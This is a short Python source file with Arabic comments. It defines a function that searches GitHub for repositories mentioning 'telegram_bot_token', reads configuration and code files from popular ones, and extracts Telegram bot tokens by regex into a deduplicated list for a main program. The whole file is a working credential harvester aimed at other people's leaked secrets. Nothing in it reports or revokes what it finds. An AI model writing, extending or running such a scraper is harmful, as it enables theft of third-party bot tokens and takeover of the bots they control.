import re
import os
import requests
from github import Github, RateLimitExceededException

# إعدادات الاتصال
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
g = Github(GITHUB_TOKEN)

def search_for_tokens():
    """
    الدالة المطلوبة في main.py
    تعيد قائمة بالتوكنات الفريدة المكتشفة من مستودعات عالية الجودة
    """
    found_tokens = []
    
    try:
        # التحقق من رصيد API
        if g.get_rate_limit().search.remaining < 5:
            return []

        # البحث عن مستودعات نشطة (أكثر من 10 نجوم لضمان الجودة)
        # نستخدم query تركز على التوكنات البرمجية
        repositories = g.search_repositories(query="telegram_bot_token", sort="updated")[:10]
        
        for repo in repositories:
            # فلترة الجودة: تجاهل المشاريع المهجورة
            if repo.stargazers_count < 10:
                continue
            
            try:
                contents = repo.get_contents("")
                for content in contents:
                    # التركيز على ملفات الإعدادات
                    if content.type == "file" and content.name.endswith(('.py', '.env', '.yml', '.json')):
                        try:
                            file_content = content.decoded_content.decode('utf-8', errors='ignore')
                            # Regex لاستخراج التوكنات
                            tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', file_content)
                            found_tokens.extend(tokens)
                        except:
                            continue
            except:
                continue
                
    except RateLimitExceededException:
        print("[!] GitHub API limit reached.")
    except Exception as e:
        print(f"[!] Scanner Error: {e}")
        
    return list(set(found_tokens))
